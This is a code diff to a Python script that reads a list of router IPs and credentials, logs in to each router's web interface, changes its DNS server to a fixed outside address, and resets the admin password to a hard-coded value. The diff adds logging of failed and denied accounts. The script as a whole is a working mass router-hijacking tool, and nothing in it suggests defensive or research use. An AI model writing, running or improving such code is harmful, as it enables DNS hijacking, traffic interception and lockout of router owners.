@@ -3,10 +3,10 @@ import json
 import logging
 from template import data_login, get_conf, wlan, set_pass
 from jsdecode import encrypt_field
-DNS = "79.134.3.101"
-GOOGLE_DNS = "8.8.4.4"
+DNS = "20.113.131.27"
+GOOGLE_DNS = "8.8.8.8"
 NEW_PASSWORD = "12qwaszx"
-TIMEOUT = 60
+TIMEOUT = 10
 
 logging.basicConfig(filename='out.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -15,7 +15,11 @@ with open("accounts.txt") as f:
     accounts = f.readlines()
 
 for router in accounts:
-    ip, port, login_and_pass, *other = router.rstrip().split(" ")
+    tmp = router.rstrip().split(" ")
+    ip  = tmp[0]
+    port  = tmp[1]
+    login_and_pass = tmp[2]
+
     try:
         login_tmp, password_tmp = login_and_pass.rstrip().split(":")
         password = encrypt_field(login_tmp, password_tmp)
@@ -42,6 +46,7 @@ for router in accounts:
         resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_data, timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
+        print(f'Error Auth: {ip} Used: {login}:{password} TimeOut: {TIMEOUT}')
         continue
     try:
         logger.info(f'status code: {resp.status_code}')
@@ -50,6 +55,10 @@ for router in accounts:
         if body.get('error', False):
             logger.info(f'Error:: {body.get("error")}')
             print(f'Error:: {body.get("error")}')
+            # Access denied'
+            with open("access_denied_accounts.txt", "a") as fh:
+                fh.write(f"{ip} Access denied\n")
+
         # {'jsonrpc': '2.0', 'id': 0, 'error': {'code': -32000, 'message': 'Access denied'}}
         session_id = body.get('result')[0].get('session_id')
         logger.info(f'session_id: {session_id}')
@@ -84,6 +93,7 @@ for router in accounts:
         resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_wlan_conf,  timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
+        print(f'Error Update Settings: {ip} Used DNS: {DNS} AND GOOGLE DNS {GOOGLE_DNS} TimeOut: {TIMEOUT}')
         continue
 
 
@@ -107,6 +117,9 @@ for router in accounts:
         resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_set_pass,  timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
+        print(f"Error SetUp Login: {login_tmp} Password: {NEW_PASSWORD}  TimeOut: {TIMEOUT}")
+        with open("error_accounts.txt", "a") as fh:
+            fh.write(f"{ip}@{login_tmp}:{password}\n")
         continue
 
     with open("new_accounts.txt", "a") as fh:
